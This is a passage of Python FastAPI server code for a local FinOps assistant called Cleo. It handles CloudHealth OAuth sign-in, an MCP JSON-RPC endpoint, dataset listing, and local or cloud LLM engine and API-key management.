        _ai = AIClient(engine_key, cfg, tools=_tools)
        _last_error = ""
        logger.info(f"✅ [MCP Init Success] Connected to CloudHealth MCP with {len(_tools)} tools! Engine: {_engine_label}")
        return True
    except Exception as e:
        _last_error = str(e)
        _mcp = None
        _tools = []
        if any(w in str(e).lower() for w in ["401", "403", "unauthorized", "expired", "-32001"]):
            logger.info(f"ℹ️ [MCP Init] CloudHealth is disconnected ({e}).")
        else:
            logger.error(f"❌ [MCP Init Error] {e}")
        return False



# ── Authentication Endpoints ──────────────────────────────────────────────────

@app.get("/auth/login")
def auth_login():
    """
    Generates the PKCE authorization URL for Cleo's independent OAuth client.
    Directly redirects to CloudHealth login and returns automatically
    to http://127.0.0.1:8080/oauth-callback without any third-party pages.
    """
    cid = auth_helper.client_id
    ruri = auth_helper.redirect_uri

    auth_url, verifier, params = auth_helper.generate_auth_params(client_id=cid, redirect_uri=ruri)
    state = params["state"]
    
    info = {
        "verifier": verifier,
        "client_id": cid,
        "redirect_uri": ruri,
        "timestamp": time.time()
    }
    _save_pending_verifier(state, info)
    logger.info(f"[OAuth Login] Redirecting directly to CloudHealth (client: {cid[:20]}..., state: {state})")
    return RedirectResponse(url=auth_url)

class CodeSubmission(BaseModel):
    code: str

@app.post("/auth/submit-code")
def auth_submit_code(sub: CodeSubmission):
    """Exchanges an authorization code (or full callback URL) for access token."""
    global _last_error
    raw_code = sub.code.strip()
    if not raw_code:
        raise HTTPException(status_code=400, detail="Empty authorization code provided")

    # Auto-extract code if user pasted a full redirect URL
    code = raw_code
    pasted_state = None
    if "code=" in raw_code:
        parsed = urllib.parse.urlparse(raw_code)
        qs = urllib.parse.parse_qs(parsed.query or parsed.fragment)
        if "code" in qs:
            code = qs["code"][0].strip()
        if "state" in qs:
            pasted_state = qs["state"][0].strip()

    logger.info(f"[OAuth Submit Code] Processing authorization code ({code[:10]}...{code[-6:] if len(code)>16 else ''})")
    
    # Retrieve pending verifier from memory or disk
    all_verifiers = dict(_oauth_verifiers)
    all_verifiers.update(_load_pending_verifiers())
    
    verifier_info = None
    if pasted_state:
        # A pasted callback URL carries `state`: bind to the matching sign-in attempt, as /oauth-callback does.
        verifier_info = all_verifiers.get(pasted_state)
        if not verifier_info:
            raise HTTPException(status_code=400, detail="The pasted URL's state does not match a pending sign-in. Start sign-in again.")
    elif all_verifiers:
        # A bare code has no state to check; fall back to the newest pending sign-in.
        sorted_keys = sorted(all_verifiers.keys(), key=lambda k: all_verifiers[k].get("timestamp", 0), reverse=True)
        verifier_info = all_verifiers[sorted_keys[0]]

    verifier = verifier_info.get("verifier") if verifier_info else ""
    client_id = verifier_info.get("client_id", auth_helper.client_id) if verifier_info else auth_helper.client_id
    redirect_uri = verifier_info.get("redirect_uri", auth_helper.redirect_uri) if verifier_info else auth_helper.redirect_uri

    mcp_data = auth_helper.exchange_code(
        code=code, 
        verifier=verifier, 
        client_id=client_id, 
        redirect_uri=redirect_uri
    )
    if not mcp_data:
        err = getattr(auth_helper, "last_error", "") or "Token exchange failed."
        _last_error = err
        logger.error(f"[OAuth Submit Code Failed] {err}")
        raise HTTPException(status_code=400, detail=err)

    # Clean up verifiers
    _oauth_verifiers.clear()
    if os.path.exists(VERIFIER_CACHE_FILE):
        try:
            os.remove(VERIFIER_CACHE_FILE)
        except Exception:
            pass

    # Initialize MCP
    success = init_mcp_if_authenticated()
    if not success:
        err = _last_error or "CloudHealth MCP initialization failed."
        raise HTTPException(status_code=403, detail=err)

    return {
        "success": True,
        "mcp_connected": success,
        "tools_count": len(_tools),
        "tools": _tools,
        "last_error": ""
    }

@app.post("/auth/logout")
def auth_logout():
    """Disconnects CloudHealth session and purges stored tokens."""
    global _mcp, _tools, _ai, _sessions, _last_error, _oauth_verifiers
    logger.info("[OAuth Logout] Disconnecting CloudHealth session and purging stored tokens...")
    auth_helper.clear_tokens()
    if os.path.exists(VERIFIER_CACHE_FILE):
        try:
            os.remove(VERIFIER_CACHE_FILE)
        except Exception:
            pass
    _mcp = None
    _tools = []
    # ponytail: do NOT wipe persisted session histories on cloudhealth logout
    _oauth_verifiers.clear()
    _last_error = ""
    return {"status": "logged_out", "message": "CloudHealth disconnected and tokens cleared."}

@app.get("/oauth-callback")
def oauth_callback(code: Optional[str] = None, state: Optional[str] = None, error: Optional[str] = None):
    """Handles automatic callback from CloudHealth."""
    global _last_error
    if error or not code:
        err_msg = error or "No authorization code received from CloudHealth."
        _last_error = err_msg
        logger.error(f"[OAuth Callback Error] {err_msg}")
        return HTMLResponse(content=f"""
        <html><body style="font-family:sans-serif;background:#0f1117;color:#f87171;display:flex;align-items:center;justify-content:center;height:100vh;">
            <div style="background:#1a1d27;padding:32px;border-radius:12px;text-align:center;max-width:500px;border:1px solid #2d3148;">
                <h2>Authentication Failed</h2>
                <p style="color:#94a3b8;margin:16px 0;">{html_escape(err_msg)}</p>
                <a href="/" style="color:#6366f1;text-decoration:none;font-weight:600;">Return to Cleo</a>
            </div>
        </body></html>
        """, status_code=400)

    all_verifiers = dict(_oauth_verifiers)
    all_verifiers.update(_load_pending_verifiers())
    verifier_info = all_verifiers.pop(state, None) if state else None
    if not verifier_info:
        logger.error(f"[OAuth Callback Error] Unknown or missing state parameter: {state!r}")
        _last_error = "OAuth callback rejected: state parameter did not match a pending authorization request."
        return HTMLResponse(content=f"""
        <html><body style="font-family:sans-serif;background:#0f1117;color:#f87171;display:flex;align-items:center;justify-content:center;height:100vh;">
            <div style="background:#1a1d27;padding:32px;border-radius:12px;text-align:center;max-width:500px;border:1px solid #2d3148;">
                <h2>Authentication Failed</h2>
                <p style="color:#94a3b8;margin:16px 0;">{html_escape(_last_error)}</p>
                <a href="/" style="color:#6366f1;text-decoration:none;font-weight:600;">Return to Cleo</a>
            </div>
        </body></html>
        """, status_code=400)

    verifier = verifier_info.get("verifier", "") if verifier_info else ""
    client_id = verifier_info.get("client_id", auth_helper.client_id) if verifier_info else auth_helper.client_id
    redirect_uri = verifier_info.get("redirect_uri", auth_helper.redirect_uri) if verifier_info else auth_helper.redirect_uri

    logger.info(f"[OAuth Callback] Exchanging code ({code[:10]}...{code[-6:]}) with client {client_id[:25]}...")
    mcp_data = auth_helper.exchange_code(
        code=code, 
        verifier=verifier, 
        client_id=client_id, 
        redirect_uri=redirect_uri
    )
    if not mcp_data:
        err = getattr(auth_helper, "last_error", "") or "Token exchange failed."
        _last_error = err
        logger.error(f"[OAuth Callback Exchange Error] {err}")
        return HTMLResponse(content=f"""
        <html><body style="font-family:sans-serif;background:#0f1117;color:#f87171;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;">
            <div style="background:#1a1d27;padding:36px;border-radius:16px;text-align:center;max-width:540px;border:1px solid #2d3148;">
                <h2 style="color:#f87171;margin-bottom:12px;">Authentication Issue</h2>
                <p style="color:#94a3b8;font-size:0.9rem;margin-bottom:24px;word-break:break-all;">{html_escape(err)}</p>
                <a href="/auth/login" style="background:#6366f1;color:white;padding:10px 22px;border-radius:8px;text-decoration:none;font-weight:600;display:inline-block;">Retry Connection</a>
            </div>
        </body></html>
        """, status_code=400)

    # Initialize MCP client with new token
    init_mcp_if_authenticated()

    return HTMLResponse(content="""
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="utf-8">
      <title>Cleo Connected</title>
      <meta http-equiv="refresh" content="1;url=/">
      <style>
        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #0f1117; color: #f8fafc;
               display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { background: #1a1d27; padding: 40px; border-radius: 16px; text-align: center; border: 1px solid #2d3148; }
        h1 { color: #10b981; margin-bottom: 8px; font-size: 1.5rem; }
        p { color: #94a3b8; font-size: 0.95rem; }
      </style>
    </head>
    <body>
      <div class="box">
        <div style="font-size: 2.5rem; margin-bottom: 12px;">✅</div>
        <h1>Successfully Connected to CloudHealth!</h1>
        <p>Loading your CloudHealth FinOps datasets...</p>
      </div>
    </body>
    </html>
    """)

# ── API Routes ────────────────────────────────────────────────────────────────

@app.get("/api/logs")
def get_logs(limit: int = 150):
    """Returns the latest backend verbose logs for in-GUI inspection."""
    return {"logs": get_recent_logs(limit)}

_last_health_init_attempt = 0.0
_HEALTH_INIT_COOLDOWN_SECS = 60.0

@app.get("/health")
def health():
    global _mcp, _tools, _last_error, _last_health_init_attempt
    is_connected = bool(_mcp and _tools and not getattr(_mcp, "_use_fallback", False))
    
    # If not connected, only attempt an auto-init probe if cooldown has elapsed
    if not is_connected:
        now = time.time()
        if (now - _last_health_init_attempt) >= _HEALTH_INIT_COOLDOWN_SECS:
            _last_health_init_attempt = now
            token = get_access_token(interactive=False)
            if token:
                init_mcp_if_authenticated()
                is_connected = bool(_mcp and _tools and not getattr(_mcp, "_use_fallback", False))

    has_token = bool(_mcp and _tools) or bool(auth_helper.load_token())

    if is_connected:
        mcp_status = "connected"
    elif _last_error and not any(w in _last_error.lower() for w in ["expired", "disconnected", "401", "unauthorized"]):
        mcp_status = "unauthorized"
    else:
        mcp_status = "disconnected"

    return {
        "status": "ok" if is_connected else ("error" if mcp_status == "unauthorized" else "unauthenticated"),
        "mcp": mcp_status,
        "has_token": has_token,
        "tools_count": len(_tools) if is_connected else 0,
        "tools": _tools if is_connected else [],
        "ai_engine": _engine_label,
        "ai_engine_key": _active_engine_key,
        "active_sessions": len(_sessions),
        "last_error": _last_error
    }

# ── n8n Orchestrator Compatibility Endpoints ────────────────────────────────
@app.api_route("/start", methods=["GET", "POST"])
def start_model(model: str = "qwen-3b"):
    """Compatibility endpoint for n8n orchestrator to activate/preload a model."""
    global _active_engine_key, _engine_label, _ai
    logger.info(f"🚀 [n8n /start] Requested model: {model}")
    target_engine = None
    label = model
    if "3b" in model.lower():
        target_engine = "mlx:mlx-community/Qwen2.5-3B-Instruct-4bit"
        label = "Qwen2.5-3B-Instruct-4bit (MLX)"
    elif "7b" in model.lower() or "deep" in model.lower():
        target_engine = "mlx:mlx-community/Qwen2.5-7B-Instruct-4bit"
        label = "Qwen2.5-7B-Instruct-4bit (MLX)"
    elif model.startswith("mlx:") or model.startswith("ollama:") or model in ("gemini", "openai", "anthropic"):
        target_engine = model
        label = model

    if target_engine and target_engine != _active_engine_key:
        old_engine = _active_engine_key
        _active_engine_key = target_engine
        _engine_label = label
        cfg = _load_config()
        _ai = AIClient(_active_engine_key, cfg, tools=_tools)
        if old_engine.startswith("mlx:"):
            unload_mlx_models(old_engine)
        elif old_engine.startswith("ollama:"):
            unload_ollama_models(old_engine)
        logger.info(f"🔄 [n8n /start] Switched active engine to {_engine_label}")

    return {"status": "ok", "model": model, "active_engine": _active_engine_key}

@app.api_route("/stop", methods=["GET", "POST"])
def stop_model(model: str = "qwen-3b"):
    """Compatibility endpoint for n8n orchestrator to stop/release a model from memory."""
    logger.info(f"🛑 [/stop] Requested stop for model: {model}")
    if model.startswith("mlx:") or "mlx" in model.lower():
        unload_mlx_models(model)
    else:
        unload_ollama_models(model)
    return {"status": "ok", "model": model, "stopped": True}

@app.api_route("/stop_all", methods=["GET", "POST"])
def stop_all_models():
    """Compatibility endpoint for n8n orchestrator to stop/release all models from memory."""
    logger.info("🛑 [/stop_all] Requested stop for all models")
    unload_mlx_models()
    unload_ollama_models()
    return {"status": "ok", "stopped": True}

@app.api_route("/api/shutdown", methods=["GET", "POST"])
def shutdown_server():
    """Cleanly unloads all models, releases resources, and terminates the server process."""
    logger.info("🛑 [/api/shutdown] Clean shutdown requested. Unloading models and exiting...")
    def _exit_worker():
        try:
            unload_mlx_models()
            unload_ollama_models()
        except Exception:
            pass
        time.sleep(0.3)
        os._exit(0)
    threading.Thread(target=_exit_worker, daemon=True, name="shutdown-worker").start()
    return {"status": "shutting_down"}


@app.api_route("/mcp", methods=["GET", "POST"])
async def mcp_endpoint(request: Request):
    """
    Model Context Protocol (MCP) JSON-RPC 2.0 and SSE endpoint for external orchestrators (e.g. n8n).
    """
    global _mcp, _tools
    if not _mcp or not _tools:
        init_mcp_if_authenticated()

    if request.method == "GET":
        accept = request.headers.get("accept", "")
        if "text/event-stream" in accept:
            async def event_generator():
                yield "event: endpoint\ndata: /mcp\n\n"
            return StreamingResponse(event_generator(), media_type="text/event-stream")
        return {"status": "ok", "mcp": "ready" if _mcp else "unauthenticated", "tools_count": len(_tools)}

    try:
        body = await request.json()
    except Exception:
        return JSONResponse(status_code=400, content={"jsonrpc": "2.0", "error": {"code": -32700, "message": "Parse error"}, "id": None})

    method = body.get("method")
    req_id = body.get("id")
    params = body.get("params", {})

    logger.info(f"🔌 [n8n /mcp] JSON-RPC method: {method} (id: {req_id})")

    if method == "initialize":
        return {
            "jsonrpc": "2.0",
            "id": req_id,
            "result": {
                "protocolVersion": "2024-11-05",
                "capabilities": {
                    "tools": {"listChanged": False}
                },
                "serverInfo": {
                    "name": "cleo-cloudhealth-mcp",
                    "version": "2.1.0"
                }
            }
        }
    elif method in ("notifications/initialized", "initialized"):
        return Response(status_code=204)
    elif method == "ping":
        return {"jsonrpc": "2.0", "id": req_id, "result": {}}
    elif method == "tools/list":
        tools_to_return = _tools if _tools else STANDARD_CH_TOOLS
        return {
            "jsonrpc": "2.0",
            "id": req_id,
            "result": {
                "tools": tools_to_return
            }
        }
    elif method == "tools/call":
        tool_name = params.get("name")
        tool_args = params.get("arguments", {})
        if not tool_name:
            return {
                "jsonrpc": "2.0",
                "id": req_id,
                "error": {"code": -32602, "message": "Missing tool name in params"}
            }
        try:
            if _mcp:
                res = _mcp.call_tool(tool_name, tool_args)
            else:
                res = {
                    "content": [{"type": "text", "text": "CloudHealth MCP is not authenticated. Please authenticate via the Cleo Web UI."}],
                    "isError": True
                }
            return {
                "jsonrpc": "2.0",
                "id": req_id,
                "result": res
            }
        except Exception as e:
            logger.error(f"❌ [n8n /mcp] Tool call error for {tool_name}: {e}")
            return {
                "jsonrpc": "2.0",
                "id": req_id,
                "result": {
                    "content": [{"type": "text", "text": f"Error executing tool '{tool_name}': {str(e)}"}],
                    "isError": True
                }
            }
    else:
        return {
            "jsonrpc": "2.0",
            "id": req_id,
            "error": {"code": -32601, "message": f"Method not found: {method}"}
        }

@app.get("/api/tools")
def get_tools():
    return {"tools": _tools}

@app.get("/api/datasets")
def get_available_datasets():
    """
    Returns the list of available CloudHealth standard and custom datasets,
    prioritized by curated FinOps relevance and categorized by cloud provider / domain.
    """
    metadata_map = get_cached_datasource_metadata() or {}
    datasets = []

    curated_order = [
        "MULTICLOUD_FOCUS_COST_AND_USAGE",
        "AWS_COST_HISTORY",
        "AZURE_COST_HISTORY",
        "GCP_COST_HISTORY",
        "AZURE_COST_USAGE",
        "AWS_CUR",
        "MULTICLOUD_AI_COST_AND_USAGE",
        "AWS_COST_HISTORY_DRILLDOWN",
        "AZURE_COST_HISTORY_DRILLDOWN",
        "UNIFIED_AI_TOKENOMICS",
        "MULTICLOUD_COMMITMENT_SAVINGS",
        "MULTICLOUD_OPERATIONAL_EMISSIONS",
        "K8S_CONTAINERS_USAGE",
        "AZURE_K8S_COST",
        "AWS_DATA_TRANSFER_COST_AND_USAGE",
        "CLOUDHEALTH_CONSUMPTION_BREAKDOWN",
        "MULTICLOUD_RIGHTSIZING_RECOMMENDATIONS",
        "WASTE_OPPORTUNITY",
    ]

    ordered_keys = [k for k in curated_order if k in metadata_map] + sorted([k for k in metadata_map.keys() if k not in curated_order])

    for k in ordered_keys:
        ds = metadata_map.get(k) or {}
        cols = ds.get("columns", [])
        spec = CURATED_DATASET_SPECS.get(k, {})
        display_name = ds.get("displayName") or spec.get("displayName") or k

        if "AWS" in k or k == "AWS_CUR":
            cat = "AWS"
        elif "AZURE" in k:
            cat = "Azure"
        elif "GCP" in k:
            cat = "Google Cloud"
        elif any(w in k for w in ("AI", "TOKEN", "LLM", "OPENAI", "ANTHROPIC")):
            cat = "AI & Foundation Models"
        elif "K8S" in k or "CONTAINER" in k:
            cat = "Kubernetes"
        elif any(w in k for w in ("FOCUS", "MULTICLOUD", "SAVINGS", "EMISSIONS", "RIGHTSIZING", "WASTE", "CONSUMPTION")):
            cat = "Multi-Cloud & Governance"
        else:
            cat = "General Telemetry"

        dim_count = sum(1 for c in cols if str(c.get("type", "")).upper() == "DIMENSION")
        meas_count = sum(1 for c in cols if str(c.get("type", "")).upper() == "MEASURE")

        datasets.append({
            "name": k,
            "displayName": display_name,
            "category": cat,
            "columns_count": len(cols),
            "dimensions_count": dim_count,
            "measures_count": meas_count,
            "description": ds.get("description") or spec.get("description", "")
        })

    return {"datasets": datasets, "total": len(datasets)}

@app.get("/api/datasets/{dataset_name:path}")
def get_dataset_columns(dataset_name: str):
    """
    Returns the columns and schema details for the requested dataset.
    """
    metadata_map = get_cached_datasource_metadata() or {}
    ds = metadata_map.get(dataset_name)
    if not ds:
        for k, v in metadata_map.items():
            if k.lower() == dataset_name.lower():
                ds = v
                dataset_name = k
                break

    if not ds and _mcp:
        try:
            res = _mcp.call_tool("get_datasource_metadata", {"dataset": dataset_name})
            txt = (res.get("content") or [{}])[0].get("text", "")
            if txt:
                parsed = json.loads(txt)
                if isinstance(parsed, dict) and "columns" in parsed:
                    ds = parsed
        except Exception as e:
            logger.warning(f"Error fetching metadata for {dataset_name}: {e}")

    if not ds:
        raise HTTPException(status_code=404, detail=f"Dataset '{dataset_name}' not found")

    spec = CURATED_DATASET_SPECS.get(dataset_name, {})
    cols = ds.get("columns", [])

    enriched_cols = []
    for c in cols:
        c_name = c.get("name", "")
        c_disp = c.get("displayName") or c_name
        c_type = str(c.get("type", "")).upper() or "DIMENSION"
        c_dtype = str(c.get("dataType", "")).upper() or "STRING"

        is_perspective = "persp" in c_name.lower()
        is_tag = any(t in c_name.lower() for t in ("tag", "vtag"))
        is_priority = (c_name in spec.get("priority_dimensions", []) or c_name in spec.get("priority_measures", []))

        enriched_cols.append({
            "name": c_name,
            "displayName": c_disp,
            "type": c_type,
            "dataType": c_dtype,
            "description": c.get("description") or "",
            "is_perspective": is_perspective,
            "is_tag": is_tag,
            "is_priority": is_priority
        })

    # Sort: Measures first (priority measures at top), then Dimensions (priority dimensions at top)
    enriched_cols.sort(key=lambda x: (x["type"] != "MEASURE", not x["is_priority"], x["name"].lower()))

    return {
        "name": dataset_name,
        "displayName": ds.get("displayName") or spec.get("displayName") or dataset_name,
        "description": ds.get("description") or spec.get("description", ""),
        "columns_count": len(enriched_cols),
        "columns": enriched_cols
    }

_customers_cache: dict = {"token": None, "data": []}

@app.get("/api/customers")
def get_channel_customers():
    """Returns org list; re-fetches only when the auth token changes."""
    global _customers_cache
    token = get_access_token(interactive=False) or ""
    if _customers_cache["token"] == token and token:
        return {"customers": _customers_cache["data"]}
    if not _mcp or not token:
        return {"customers": []}
    try:
        # list_orgs works in all tenants; list_channel_customers only in partner channels
        res = _mcp.call_tool("list_orgs", {})
        txt = (res.get("content") or [{}])[0].get("text", "") if isinstance(res, dict) else ""
        if not txt:
            raise ValueError("empty list_orgs response")
        orgs = json.loads(txt)
        cleaned = [
            {"id": o.get("id", ""), "name": (o.get("name") or "").strip(), "status": "ACTIVE"}
            for o in (orgs if isinstance(orgs, list) else [])
            if isinstance(o, dict) and o.get("name")
        ]
        _customers_cache = {"token": token, "data": cleaned}
        return {"customers": cleaned}
    except Exception as e:
        logger.warning(f"[API Customers] {e}")
        return {"customers": _customers_cache["data"]}  # return stale on error

def _get_mlx_loaded_ids() -> list[str]:
    """Returns list of 'mlx:<repo_id>' keys currently loaded in unified memory."""
    try:
        from cleo_agent import _mlx_models_cache
        return [f"mlx:{k}" for k in _mlx_models_cache.keys()]
    except Exception:
        return []

@app.get("/api/engines")
def list_engines():
    cfg = _load_config()
    sys_info = detect_system_info()
    is_apple_silicon = sys_info["is_apple_silicon"]
    rec_engine_id = sys_info["recommended_engine_id"]
    
    # 1. Curated Local MLX Models (Apple Silicon only)
    mlx_list = []
    installed_mlx_map = {}
    if is_apple_silicon:
        mlx_installed = get_installed_mlx_models()
        installed_mlx_map = {m["repo_id"]: m for m in mlx_installed}
        for mm in MLX_MODELS:
            repo_id = mm["repo_id"]
            inst_meta = installed_mlx_map.get(repo_id, {})
            is_inst = inst_meta.get("downloaded", False)
            is_active_download = inst_meta.get("is_downloading", False)
            dl_info = _model_downloads.get(repo_id, {})
            is_downloading = dl_info.get("status") == "downloading" or is_active_download

            if is_downloading:
                status = "downloading"
                progress = dl_info.get("progress", 0) or 5
                status_detail = dl_info.get("status_detail") or "Downloading model weights..."
                is_downloaded = False
            elif is_inst:
                status = "completed"
                progress = 100
                status_detail = "Download complete"
                is_downloaded = True
            else:
                status = dl_info.get("status", "")
                progress = dl_info.get("progress", 0)
                status_detail = dl_info.get("status_detail", "")
                is_downloaded = False

            tier = "recommended" if mm["id"] == rec_engine_id else mm["tier"]
            mlx_list.append({
                "id": mm["id"],
                "model_id": repo_id,
                "name": mm["name"],
                "size": inst_meta.get("size") if is_downloaded else mm["size"],
                "tier": tier,
                "desc": mm["desc"],
                "downloaded": is_downloaded,
                "download_status": status,
                "download_progress": progress,
                "status_detail": status_detail,
                "error": dl_info.get("error", "")
            })

    # 2. Curated Local Ollama Models
    ollama_models = get_installed_ollama_models()
    ollama_running = bool(ollama_models) or _check_ollama_alive()
    installed_names = [m.get("name", "") for m in ollama_models]

    local_list = []
    for m in LOCAL_MODELS:
        mid = m["id"]
        is_downloaded = any(mid in name or name.startswith(mid) for name in installed_names)
        dl_info = _model_downloads.get(mid, {})
        is_downloading = dl_info.get("status") == "downloading"

        if is_downloading:
            status = "downloading"
            progress = dl_info.get("progress", 0) or 5
            status_detail = dl_info.get("status_detail") or "Downloading model weights..."
            is_downloaded = False
        elif is_downloaded:
            status = "completed"
            progress = 100
            status_detail = "Download complete"
        else:
            status = dl_info.get("status", "")
            progress = dl_info.get("progress", 0)
            status_detail = dl_info.get("status_detail", "")

        tier = "recommended" if f"ollama:{mid}" == rec_engine_id else m["tier"]
        local_list.append({
            "id": f"ollama:{mid}",
            "model_id": mid,
            "name": m["name"],
            "size": m["size"],
            "tier": tier,
            "desc": m["desc"],
            "downloaded": is_downloaded,
            "download_status": status,
            "download_progress": progress,
            "status_detail": status_detail,
            "error": dl_info.get("error", "")
        })

    # 3. LLMs Already Available in the System (Other detected MLX & Ollama models)
    system_models = []

    # Detected MLX models in cache not in curated catalog (Apple Silicon only)
    if is_apple_silicon:
        catalog_mlx_repos = {mm["repo_id"] for mm in MLX_MODELS}
        for repo_id, meta in installed_mlx_map.items():
            if repo_id not in catalog_mlx_repos and meta.get("downloaded", False):
                short_name = repo_id.split("/")[-1]
                system_models.append({
                    "id": f"mlx:{repo_id}",
                    "model_id": repo_id,
                    "name": f"{short_name} (MLX)",
                    "framework": "MLX",
                    "size": meta.get("size", "Local"),
                    "tier": "installed",
                    "desc": f"Detected in Apple Silicon cache: {repo_id}",
                    "downloaded": True,
                    "download_status": "completed",
                    "download_progress": 100
                })

    # Detected Ollama models in daemon not in curated catalog
    catalog_ollama_ids = {lm["id"] for lm in LOCAL_MODELS}
    for om in ollama_models:
        name = om.get("name", "")
        is_curated = any(name == cid or name.startswith(cid + ":") or name.startswith(cid) for cid in catalog_ollama_ids)
        if not is_curated and name:
            size_gb = round(om.get("size", 0) / (1024**3), 1)
            details = om.get("details", {})
            param_size = details.get("parameter_size", "")
            desc_extra = f" • {param_size}" if param_size else ""
            system_models.append({
                "id": f"ollama:{name}",
                "model_id": name,
                "name": f"{name} (Ollama)",
                "framework": "Ollama",
                "size": f"{size_gb} GB" if size_gb > 0 else "Local",
                "tier": "installed",
                "desc": f"Detected in local Ollama service{desc_extra}",
                "downloaded": True,
                "download_status": "completed",
                "download_progress": 100
            })

    # 4. Public Cloud LLMs
    public_list = []
    for pe in PUBLIC_ENGINES:
        token = cfg.get(pe["env_var"]) or os.environ.get(pe["env_var"], "")
        has_token = bool(token.strip())
        public_list.append({
            "id": pe["id"],
            "name": pe["name"],
            "model": pe.get("default_model", ""),
            "env_var": pe["env_var"],
            "desc": pe["desc"],
            "configured": has_token,
            # Security (L4): no fragment preview — boolean only to avoid partial key exposure
            "configured_hint": "Configured" if has_token else ""
        })

    return {
        "active_engine": _active_engine_key,
        "active_label": _engine_label,
        "system_info": sys_info,
        "recommended_engine": rec_engine_id,
        "recommendation_reason": sys_info["recommendation_reason"],
        "mlx_available": is_apple_silicon,
        "mlx_models": mlx_list,
        "mlx_loaded_models": _get_mlx_loaded_ids(),  # models actually in memory right now
        "ollama_running": ollama_running,
        "ollama_installed": bool(_find_ollama_bin()),
        "local_models": local_list,
        "system_models": system_models,
        "public_engines": public_list,
        "direct_engine": {
            "id": "direct",
            "name": "Direct FinOps Router (Built-in)",
            "desc": "Built-in intelligent CloudHealth MCP query engine (No API key needed)"
        }
    }

class EngineSelection(BaseModel):
    engine: str

@app.post("/api/engine")
def set_engine(req: EngineSelection):
    global _active_engine_key, _engine_label, _ai

    if req.engine.startswith("mlx:"):
        repo_id = req.engine.removeprefix("mlx:").strip()
        if _model_downloads.get(repo_id, {}).get("status") == "downloading":
            raise HTTPException(status_code=400, detail=f"Model '{repo_id}' is currently downloading. Please wait for the download to finish.")
    elif req.engine.startswith("ollama:"):
        model_part = req.engine.split(":", 1)[1]
        if _model_downloads.get(model_part, {}).get("status") == "downloading":
            raise HTTPException(status_code=400, detail=f"Model '{model_part}' is currently downloading. Please wait for the download to finish.")

    old_engine = _active_engine_key
    _active_engine_key = req.engine
    
    if req.engine in AI_ENGINES:
        _engine_label = AI_ENGINES[req.engine][0]
    elif req.engine.startswith("mlx:"):
        model_part = req.engine.removeprefix("mlx:").split("/")[-1]
        _engine_label = f"{model_part} (MLX)"
    elif req.engine.startswith("ollama:"):
        model_part = req.engine.split(":", 1)[1]
        _engine_label = f"Ollama ({model_part})"
    elif req.engine in ("gemini", "openai", "anthropic"):
        pe = next((p for p in PUBLIC_ENGINES if p["id"] == req.engine), None)
        _engine_label = pe["name"] if pe else req.engine.capitalize()
    else:
        _engine_label = req.engine

    _save_config({"AI_ENGINE": req.engine})
    cfg = _load_config()
    _ai = AIClient(req.engine, cfg, tools=_tools)

    # Evict previous local model from RAM/VRAM when switching to another engine
    if old_engine and old_engine != req.engine:
        if old_engine.startswith("mlx:"):
            unload_mlx_models(old_engine)
        elif old_engine.startswith("ollama:"):
            unload_ollama_models(old_engine)

    if req.engine.startswith("ollama:") and not _check_ollama_alive():
        threading.Thread(target=_start_ollama_daemon, daemon=True).start()
    logger.info(f"🔄 [AI Engine Switched] Active engine is now: {_engine_label} ({req.engine})")
    return {"status": "ok", "engine": req.engine, "label": _engine_label}

class DownloadRequest(BaseModel):
    model: str

def _downloadable_models() -> tuple[set[str], set[str]]:
    """(mlx repo ids, ollama model names) the UI offers. Extend via CLEO_EXTRA_MODELS=a,b,c
    (entries starting with 'mlx:' or containing 'mlx-community/' are treated as MLX repos)."""
    mlx = {m["repo_id"] for m in MLX_MODELS}
    ollama = {m["id"] for m in LOCAL_MODELS}
    for extra in (e.strip() for e in os.environ.get("CLEO_EXTRA_MODELS", "").split(",") if e.strip()):
        (mlx if extra.startswith("mlx:") or "mlx-community/" in extra else ollama).add(extra.removeprefix("mlx:"))
    return mlx, ollama

@app.post("/api/models/download")
def download_model(req: DownloadRequest, request: Request):
    _limit_expensive(request, "models-download")
    model = req.model.strip()
    # Security: only catalogued models. Previously any string containing "mlx" became an arbitrary
    # Hugging Face repo and anything else an arbitrary `ollama pull` target (incl. third-party registries).
    allowed_mlx, allowed_ollama = _downloadable_models()
    if model.removeprefix("mlx:") in allowed_mlx:
        repo_id = model.removeprefix("mlx:")
        existing = _model_downloads.get(repo_id, {})
        if existing.get("status") == "downloading":
            return {"status": "already_downloading", "progress": existing.get("progress", 0)}
        t = threading.Thread(target=_bg_pull_mlx_model, args=(repo_id,), daemon=True)
        t.start()
        return {"status": "started", "model": repo_id, "type": "mlx"}

    if model not in allowed_ollama:
        raise HTTPException(status_code=400, detail=f"Model '{model}' is not in Cleo's model catalog.")

    existing = _model_downloads.get(model, {})
    if existing.get("status") == "downloading":
        return {"status": "already_downloading", "progress": existing.get("progress", 0)}

    t = threading.Thread(target=_bg_pull_model, args=(model,), daemon=True)
    t.start()
    return {"status": "started", "model": model, "type": "ollama"}

@app.get("/api/models/download-status")
def get_download_status():
    return {"downloads": _model_downloads}

class TokenUpdateRequest(BaseModel):
    engine: str
    token: str

@app.post("/api/tokens")
def save_token(req: TokenUpdateRequest):
    global _ai
    env_map = {
        "gemini": "GEMINI_API_KEY",
        "openai": "OPENAI_API_KEY",
        "anthropic": "ANTHROPIC_API_KEY"
    }
    env_var = env_map.get(req.engine.lower())
    if not env_var:
        raise HTTPException(status_code=400, detail=f"Unknown public LLM engine: {req.engine}")

    clean_token = req.token.strip()
    if not clean_token:
        return delete_token(req.engine)

    _save_config({env_var: clean_token})
    os.environ[env_var] = clean_token
    cfg = _load_config()
    if _ai:
        _ai.cfg = cfg
    logger.info(f"🔑 [Token Saved] Updated token for engine: {req.engine}")
    return {"status": "ok", "engine": req.engine}

@app.delete("/api/tokens/{engine}")
def delete_token(engine: str):
    global _ai, _active_engine_key, _engine_label
    env_map = {
        "gemini": "GEMINI_API_KEY",
        "openai": "OPENAI_API_KEY",
        "anthropic": "ANTHROPIC_API_KEY"
    }
    env_var = env_map.get(engine.lower())
    if not env_var:
        raise HTTPException(status_code=400, detail=f"Unknown public LLM engine: {engine}")

    _save_config({env_var: None})
    os.environ.pop(env_var, None)

    cfg = _load_config()
    if _ai:
        _ai.cfg = cfg

    switched = False
    new_engine = _active_engine_key
    if _active_engine_key == engine.lower():
        sys_info = detect_system_info()
        fallback = sys_info.get("recommended_engine_id") or "direct"
